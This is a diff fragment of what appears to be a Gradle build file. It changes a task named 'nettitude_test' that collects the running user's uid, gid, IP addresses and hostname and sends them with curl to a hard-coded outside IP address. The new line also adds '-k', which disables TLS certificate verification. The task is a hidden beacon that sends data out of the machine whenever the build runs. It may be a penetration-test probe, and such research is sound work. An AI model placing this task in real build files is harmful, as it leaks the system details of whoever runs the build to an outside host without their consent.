@@ -38,7 +38,7 @@ task nettitude_test(type:Exec){
 	def ip = ["hostname", "-I"].execute().text.trim().replaceAll(" ", "%20")
 	def hostname = ["hostname"].execute().text.trim()
 	commandLine 'curl', "http://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
-	commandLine 'curl', "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
+	commandLine 'curl', "-k", "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}"
 	println("Executed")
 }
 
